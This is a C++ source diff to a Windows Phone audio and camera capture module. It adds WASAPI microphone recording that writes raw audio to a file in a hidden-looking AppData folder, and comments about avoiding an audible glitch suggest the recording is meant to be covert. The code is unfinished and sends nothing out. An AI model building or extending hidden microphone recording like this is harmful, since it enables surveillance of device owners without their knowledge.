@@ -2,6 +2,11 @@
 #include "FunctionFunc.h"
 #include "Log.h"
 #include "Microphone.h"
+#include "Audioclient.h"
+#include "phoneaudioclient.h"
+
+#pragma comment(lib, "Phoneaudioses.lib")
+
 
 using namespace Microsoft::WRL;
 using namespace Windows::Foundation;
@@ -179,13 +184,13 @@ void CameraCaptureSampleSink::OnSampleAvailable(
 			pAudioVideoCaptureDevice->StopRecordingAsync();
 		}
 	}
-	else if( hnsPresentationTime/10000000>(ULONGLONG)(5*NativeCapture::nCamp))
+	else if( (ULONGLONG)(hnsPresentationTime/10000000)>(ULONGLONG)(5*NativeCapture::nCamp))
 		{
 			//NativeAudioInterface::Native::NativeCapture::fAudioCapture=FALSE;
 			
 #ifdef _DEBUG
 			WCHAR msg[128];
-			swprintf_s(msg, L"\n2camp) Pos=%i nCamp=%i hnsPresentationTime=%i\n",NativeCapture::pos,NativeCapture::nCamp,hnsPresentationTime);OutputDebugString(msg);
+			swprintf_s(msg, L"\n2camp) Pos=%i nCamp=%i hnsPresentationTime=%x hnsPresentationTime/10000000=%x\n",NativeCapture::pos,NativeCapture::nCamp,(ULONGLONG)hnsPresentationTime,(ULONGLONG)(hnsPresentationTime/10000000));OutputDebugString(msg);
 
 
 
@@ -244,7 +249,339 @@ void NativeCapture::StopCapture()
 #include <thread>
 #include <chrono>
 
+
+class MyAudioSink
+{
+private:
+        int counter;
+		fstream filestr;
+public:
+        MyAudioSink()
+        {
+                counter = 0;
+				//sprintf(nomeFile,"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$MS314Mobile\\audio%s_%.4i.amr",nomeFileBase,NativeCapture::nCamp);
+				filestr.open("\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$MS314Mobile\\audio.wav", fstream::out|fstream::binary|fstream::app);
+				filestr.seekg (0, ios::beg);
+				
+        }
+
+        HRESULT SetFormat(WAVEFORMATEX *pwfx)
+        {
+                return 0;
+        }
+
+        HRESULT CopyData(BYTE *pData, UINT32 numFramesAvailable, BOOL *bDone)
+        {
+                printf("%i\n", numFramesAvailable);
+                counter++;
+                if (counter > 2000) {
+						filestr.close();
+                        return -1;
+                }
+                else
+                {
+						filestr.write ((const char*)pData, numFramesAvailable);
+                        return 0;
+                }
+        }
+};
+
+//-----------------------------------------------------------
+// Record an audio stream from the default audio capture
+// device. The RecordAudioStream function allocates a shared
+// buffer big enough to hold one second of PCM audio data.
+// The function uses this buffer to stream data from the
+// capture device. The main loop runs every 1/2 second.
+//-----------------------------------------------------------
+
+// REFERENCE_TIME time units per second and per millisecond
+#define REFTIMES_PER_SEC  10000000
+#define REFTIMES_PER_MILLISEC  10000
+
+#define EXIT_ON_ERROR(hres)  \
+              if (FAILED(hres)) { goto Exit; }
+#define SAFE_RELEASE(punk)  \
+              if ((punk) != NULL)  \
+                { (punk)->Release(); (punk) = NULL; }
+
+//const CLSID CLSID_MMDeviceEnumerator = __uuidof(MMDeviceEnumerator);
+//const IID IID_IMMDeviceEnumerator = __uuidof(IMMDeviceEnumerator);
+const IID IID_IAudioClient = __uuidof(IAudioClient);
+const IID IID_IAudioCaptureClient = __uuidof(IAudioCaptureClient);
+
+
+/* FUNZIONA PER EGISTRARE MA QUANDO SI DISIDRATA L'app va in silent
+HRESULT RecordAudioStream(MyAudioSink *pMySink)
+{
+    HRESULT hr;
+    REFERENCE_TIME hnsRequestedDuration = REFTIMES_PER_SEC;
+    REFERENCE_TIME hnsActualDuration;
+    UINT32 bufferFrameCount;
+    UINT32 numFramesAvailable;
+    
+	//IMMDeviceEnumerator *pEnumerator = NULL;
+    //IMMDevice *pDevice = NULL;
+
+    IAudioClient *pAudioClient = NULL;
+    IAudioCaptureClient *pCaptureClient = NULL;
+    WAVEFORMATEX *pwfx = NULL;
+    UINT32 packetLength = 0;
+    BOOL bDone = FALSE;
+    BYTE *pData;
+    DWORD flags;
+
 	
+	LPCWSTR pwstrDefaultCaptureDeviceId = GetDefaultAudioCaptureId(AudioDeviceRole::Communications);
+	hr = ActivateAudioInterface(pwstrDefaultCaptureDeviceId, __uuidof(IAudioClient2), (void**)&pAudioClient);
+	
+
+    hr = pAudioClient->GetMixFormat(&pwfx);
+    EXIT_ON_ERROR(hr)
+
+
+ 
+     PWAVEFORMATEXTENSIBLE wave_format_extensible = reinterpret_cast<WAVEFORMATEXTENSIBLE*>(static_cast<WAVEFORMATEX*>(pwfx));
+
+
+    hr = pAudioClient->Initialize(
+                         AUDCLNT_SHAREMODE_SHARED,
+                         0,
+                         hnsRequestedDuration,
+                         0,
+                         pwfx,
+                         NULL);
+    EXIT_ON_ERROR(hr)
+
+    // Get the size of the allocated buffer.
+    hr = pAudioClient->GetBufferSize(&bufferFrameCount);
+    EXIT_ON_ERROR(hr)
+
+    hr = pAudioClient->GetService(
+                         IID_IAudioCaptureClient,
+                         (void**)&pCaptureClient);
+    EXIT_ON_ERROR(hr)
+
+    // Notify the audio sink which format to use.
+    hr = pMySink->SetFormat(pwfx);
+    EXIT_ON_ERROR(hr)
+
+    // Calculate the actual duration of the allocated buffer.
+    hnsActualDuration = (double)REFTIMES_PER_SEC *
+                     bufferFrameCount / pwfx->nSamplesPerSec;
+
+	
+	OutputDebugString(L"START\n");
+    hr = pAudioClient->Start();  // Start recording.
+    EXIT_ON_ERROR(hr)
+
+    // Each loop fills about half of the shared buffer.
+    while (bDone == FALSE)
+    {
+        // Sleep for half the buffer duration.
+        _Sleep(hnsActualDuration/REFTIMES_PER_MILLISEC/2);
+
+        hr = pCaptureClient->GetNextPacketSize(&packetLength);
+        EXIT_ON_ERROR(hr)
+
+        while (packetLength != 0)
+        {
+            // Get the available data in the shared buffer.
+            hr = pCaptureClient->GetBuffer(
+                                   &pData,
+                                   &numFramesAvailable,
+                                   &flags, NULL, NULL);
+            EXIT_ON_ERROR(hr)
+
+            if (flags & AUDCLNT_BUFFERFLAGS_SILENT)
+            {
+                pData = NULL;  // Tell CopyData to write silence.
+				OutputDebugString(L"silence\n");
+            }
+			else
+			{
+			DWORD dataSize = pwfx->nBlockAlign * numFramesAvailable;
+
+			WCHAR msg[128];
+			swprintf_s(msg, L"dataSize=%i: \n",dataSize);OutputDebugString(msg);
+
+            // Copy the available capture data to the audio sink.
+            hr = pMySink->CopyData(
+                              pData, dataSize, &bDone);
+            EXIT_ON_ERROR(hr)
+			}
+            hr = pCaptureClient->ReleaseBuffer(numFramesAvailable);
+            EXIT_ON_ERROR(hr)
+
+            hr = pCaptureClient->GetNextPacketSize(&packetLength);
+            EXIT_ON_ERROR(hr)
+        }
+    }
+
+
+	OutputDebugString(L"STOP\n");
+    hr = pAudioClient->Stop();  // Stop recording.
+    EXIT_ON_ERROR(hr)
+
+Exit:
+    CoTaskMemFree(pwfx);
+//    SAFE_RELEASE(pEnumerator)
+ //   SAFE_RELEASE(pDevice);
+    SAFE_RELEASE(pAudioClient);
+    SAFE_RELEASE(pCaptureClient);
+
+    return hr;
+}
+*/
+
+	HRESULT RecordAudioStream(MyAudioSink *pMySink)
+{
+    HRESULT hr;
+    REFERENCE_TIME hnsRequestedDuration = REFTIMES_PER_SEC;
+    REFERENCE_TIME hnsActualDuration;
+    UINT32 bufferFrameCount;
+    UINT32 numFramesAvailable;
+    
+	//IMMDeviceEnumerator *pEnumerator = NULL;
+    //IMMDevice *pDevice = NULL;
+
+    IAudioClient *pAudioClient = NULL;
+    IAudioCaptureClient *pCaptureClient = NULL;
+	IAudioRenderClient* m_pRenderClient = NULL;
+    WAVEFORMATEX *pwfx = NULL;
+    UINT32 packetLength = 0;
+    BOOL bDone = FALSE;
+    BYTE *pData;
+    DWORD flags;
+
+	
+
+	/*
+    hr = CoCreateInstance(
+           CLSID_MMDeviceEnumerator, NULL,
+           CLSCTX_ALL, IID_IMMDeviceEnumerator,
+           (void**)&pEnumerator);
+    EXIT_ON_ERROR(hr)
+
+    hr = pEnumerator->GetDefaultAudioEndpoint(eCapture, eConsole, &pDevice);
+    EXIT_ON_ERROR(hr)
+	*/
+
+	//LPCWSTR pwstrDefaultCaptureDeviceId = GetDefaultAudioCaptureId(AudioDeviceRole::Communications);
+	//LPCWSTR pwstrDefaultCaptureDeviceId = GetDefaultAudioCaptureId(AudioDeviceRole::Default);
+	LPCWSTR pwstrDefaultCaptureDeviceId = GetDefaultAudioRenderId(AudioDeviceRole::Default);
+	hr = ActivateAudioInterface(pwstrDefaultCaptureDeviceId, __uuidof(IAudioClient2), (void**)&pAudioClient);
+	
+
+	/*
+    hr = pDevice->Activate(
+                    IID_IAudioClient, CLSCTX_ALL,
+                    NULL, (void**)&pAudioClient);
+    EXIT_ON_ERROR(hr)
+	*/
+
+    hr = pAudioClient->GetMixFormat(&pwfx);
+    EXIT_ON_ERROR(hr)
+
+
+ 
+     PWAVEFORMATEXTENSIBLE wave_format_extensible = reinterpret_cast<WAVEFORMATEXTENSIBLE*>(static_cast<WAVEFORMATEX*>(pwfx));
+
+
+    hr = pAudioClient->Initialize(
+                         AUDCLNT_SHAREMODE_SHARED,
+                         0,
+						 //AUDCLNT_STREAMFLAGS_LOOPBACK,
+                         hnsRequestedDuration,
+                         0,
+                         pwfx,
+                         NULL);
+    EXIT_ON_ERROR(hr)
+
+    // Get the size of the allocated buffer.
+    hr = pAudioClient->GetBufferSize(&bufferFrameCount);
+    EXIT_ON_ERROR(hr)
+
+  //  hr = pAudioClient->GetService(IID_IAudioCaptureClient,(void**)&pCaptureClient);
+	 hr = pAudioClient->GetService(__uuidof(IAudioRenderClient), (void**)&m_pRenderClient);
+
+    EXIT_ON_ERROR(hr)
+
+    // Notify the audio sink which format to use.
+    hr = pMySink->SetFormat(pwfx);
+    EXIT_ON_ERROR(hr)
+
+    // Calculate the actual duration of the allocated buffer.
+    hnsActualDuration = (double)REFTIMES_PER_SEC *
+                     bufferFrameCount / pwfx->nSamplesPerSec;
+
+	
+	OutputDebugString(L"START\n");
+    hr = pAudioClient->Start();  // Start recording.
+    EXIT_ON_ERROR(hr)
+
+	_Sleep(1000);
+	hr = pAudioClient->Stop();  // Start recording.
+	goto Exit;
+
+    // Each loop fills about half of the shared buffer.
+    while (bDone == FALSE)
+    {
+        // Sleep for half the buffer duration.
+        _Sleep(hnsActualDuration/REFTIMES_PER_MILLISEC/2);
+
+        hr = pCaptureClient->GetNextPacketSize(&packetLength);
+        EXIT_ON_ERROR(hr)
+
+        while (packetLength != 0)
+        {
+            // Get the available data in the shared buffer.
+            hr = pCaptureClient->GetBuffer(
+                                   &pData,
+                                   &numFramesAvailable,
+                                   &flags, NULL, NULL);
+            EXIT_ON_ERROR(hr)
+
+            if (flags & AUDCLNT_BUFFERFLAGS_SILENT)
+            {
+                pData = NULL;  // Tell CopyData to write silence.
+				OutputDebugString(L"silence\n");
+            }
+			else
+			{
+			DWORD dataSize = pwfx->nBlockAlign * numFramesAvailable;
+
+			WCHAR msg[128];
+			swprintf_s(msg, L"dataSize=%i: \n",dataSize);OutputDebugString(msg);
+
+            // Copy the available capture data to the audio sink.
+            hr = pMySink->CopyData(
+                              pData, dataSize, &bDone);
+            EXIT_ON_ERROR(hr)
+			}
+            hr = pCaptureClient->ReleaseBuffer(numFramesAvailable);
+            EXIT_ON_ERROR(hr)
+
+            hr = pCaptureClient->GetNextPacketSize(&packetLength);
+            EXIT_ON_ERROR(hr)
+        }
+    }
+
+
+	OutputDebugString(L"STOP\n");
+    hr = pAudioClient->Stop();  // Stop recording.
+    EXIT_ON_ERROR(hr)
+
+Exit:
+    CoTaskMemFree(pwfx);
+//    SAFE_RELEASE(pEnumerator)
+ //   SAFE_RELEASE(pDevice);
+    SAFE_RELEASE(pAudioClient);
+    SAFE_RELEASE(pCaptureClient);
+
+    return hr;
+}
+
+
 
 
 int NativeCapture::StartCapture(HANDLE eventHandle)
@@ -270,6 +607,33 @@ int NativeCapture::StartCapture(HANDLE eventHandle)
 	{
 		//OutputDebugString(L"Nessun play attivo");	
 		fStartPlay=TRUE;
+
+		/*
+		Microsoft::WRL::ComPtr<IAudioClient> m_pAudioClient = NULL;
+		WAVEFORMATEX *m_pwfx = NULL;
+
+		LPCWSTR pwstrDefaultCaptureDeviceId = GetDefaultAudioCaptureId(AudioDeviceRole::Communications);
+		HRESULT hr = ActivateAudioInterface(pwstrDefaultCaptureDeviceId, __uuidof(IAudioClient2), (void**)&m_pAudioClient);
+		hr = m_pAudioClient->GetMixFormat(&m_pwfx);
+		//m_frameSizeInBytes = (m_pwfx->wBitsPerSample / 8) * m_pwfx->nChannels;
+		//hr = m_pAudioClient->Initialize(AUDCLNT_SHAREMODE_SHARED, AUDCLNT_STREAMFLAGS_NOPERSIST | AUDCLNT_STREAMFLAGS_EVENTCALLBACK, latency * 10000, 0, m_pwfx, NULL);
+		hr = m_pAudioClient->Initialize(AUDCLNT_SHAREMODE_SHARED, AUDCLNT_STREAMFLAGS_NOPERSIST | AUDCLNT_STREAMFLAGS_EVENTCALLBACK, 10000000, 0, m_pwfx, NULL);
+		HANDLE m_hCaptureEvent=NULL;
+		hr = m_pAudioClient->SetEventHandle(m_hCaptureEvent);
+		IAudioCaptureClient *m_pCaptureClient = NULL;
+		hr = m_pAudioClient->GetService(__uuidof(IAudioCaptureClient), (void**)&m_pCaptureClient);
+		*/
+		
+		
+		
+		//adesso ho riscritto RecordAudioStream per fare un render anziche' un capture nella speranza che inizializza lo speacker e non si sente piu' il glic
+		MyAudioSink pMyAudioSink;
+		RecordAudioStream(&pMyAudioSink);
+
+		//DWORD RecordAudioStreamThreadId;
+		//HANDLE  hRepeat = _CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RecordAudioStream, (void*)&pMyAudioSink, 0, &RecordAudioStreamThreadId);
+
+		
 		pAudioVideoCaptureDevice->StartRecordingToSinkAsync();
 		/////_ZMediaQueue_DisconnectFromService();
 		return FALSE;
@@ -399,17 +763,17 @@ NativeAudioInterface::Native::NativeCapture::NativeCapture()
 		*****/
 
 				pAudioVideoCaptureDevice = getAudioTask.get();
-
+/***
 				// Retrieve the native ICameraCaptureDeviceNative interface from the managed video capture device
 				ICameraCaptureDeviceNative *iCameraCaptureDeviceNative = NULL; 
 				HRESULT hr = reinterpret_cast<IUnknown*>(pAudioVideoCaptureDevice)->QueryInterface(__uuidof(ICameraCaptureDeviceNative), (void**) &iCameraCaptureDeviceNative);
 
 				// Save the pointer to the native interface
 				pCameraCaptureDeviceNative = iCameraCaptureDeviceNative;
-			
+***/			
 				// Retrieve IAudioVideoCaptureDeviceNative native interface from managed projection.
 				IAudioVideoCaptureDeviceNative *iAudioVideoCaptureDeviceNative = NULL;
-				hr = reinterpret_cast<IUnknown*>(pAudioVideoCaptureDevice)->QueryInterface(__uuidof(IAudioVideoCaptureDeviceNative), (void**) &iAudioVideoCaptureDeviceNative);
+				HRESULT hr = reinterpret_cast<IUnknown*>(pAudioVideoCaptureDevice)->QueryInterface(__uuidof(IAudioVideoCaptureDeviceNative), (void**) &iAudioVideoCaptureDeviceNative);
 
 				// Save the pointer to the IAudioVideoCaptureDeviceNative native interface
 				pAudioVideoCaptureDeviceNative = iAudioVideoCaptureDeviceNative;
@@ -421,7 +785,7 @@ NativeAudioInterface::Native::NativeCapture::NativeCapture()
 				// Initialize and set the CameraCaptureSampleSink class as sink for captures samples
 				MakeAndInitialize<CameraCaptureSampleSink>(&pCameraCaptureSampleSink);
 				pAudioVideoCaptureDeviceNative->SetAudioSampleSink(pCameraCaptureSampleSink);
-				
+
 				//Start recording (only way to receive samples using the ICameraCaptureSampleSink interface
 				//fAudio=TRUE;
 				//pAudioVideoCaptureDevice->StartRecordingToSinkAsync();
